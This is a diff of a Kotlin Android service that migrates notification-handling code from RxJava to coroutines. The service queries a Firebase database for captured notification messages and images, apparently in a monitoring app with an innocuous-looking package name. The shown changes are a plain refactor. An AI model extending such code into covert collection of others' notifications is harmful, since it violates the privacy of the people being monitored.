@@ -16,7 +16,7 @@ import com.safe.setting.app.utils.Consts.NOTIFICATION_MESSAGE
 import com.safe.setting.app.utils.FileHelper
 import com.safe.setting.app.utils.FileHelper.getFileNameBitmap
 import com.safe.setting.app.utils.supabase.SupabaseManager
-import io.reactivex.rxjava3.disposables.CompositeDisposable
+ 
 import kotlinx.coroutines.flow.flow
 import kotlinx.coroutines.flow.retryWhen
 import kotlinx.coroutines.flow.catch
@@ -30,14 +30,14 @@ import kotlinx.coroutines.channels.awaitClose
 import kotlinx.coroutines.flow.onEach
 import kotlinx.coroutines.flow.launchIn
 import kotlinx.coroutines.flow.distinctUntilChanged
-import kotlinx.coroutines.rx3.asFlow
+ 
 import kotlinx.coroutines.Dispatchers
 import java.io.File
 import javax.inject.Inject
 
 class InteractorNotificationService @Inject constructor(@ApplicationContext private val context: Context, private val firebase: InterfaceFirebase) : InterfaceNotificationListener {
 
-    private var disposable: CompositeDisposable = CompositeDisposable()
+    // Removed CompositeDisposable; using coroutines
 
     override fun setRunService(run: Boolean) {
         if (firebase.getUser()!=null) firebase.getDatabaseReference("$NOTIFICATION_MESSAGE/$CHILD_PERMISSION").setValue(run)
@@ -49,9 +49,9 @@ class InteractorNotificationService @Inject constructor(@ApplicationContext priv
             val job: Job = scope.launch {
                 flow {
                     val snapshot = withContext(Dispatchers.IO) {
-                        firebase.queryValueEventSingle("$NOTIFICATION_MESSAGE/$DATA","nameImage",id).blockingGet()
+                        firebase.queryValueEventSingle("$NOTIFICATION_MESSAGE/$DATA","nameImage",id)
                     }
-                    emit(snapshot?.exists() == true)
+                    emit(snapshot.exists())
                 }
                     .retryWhen { cause, attempt ->
                         val baseDelayMs = 500L
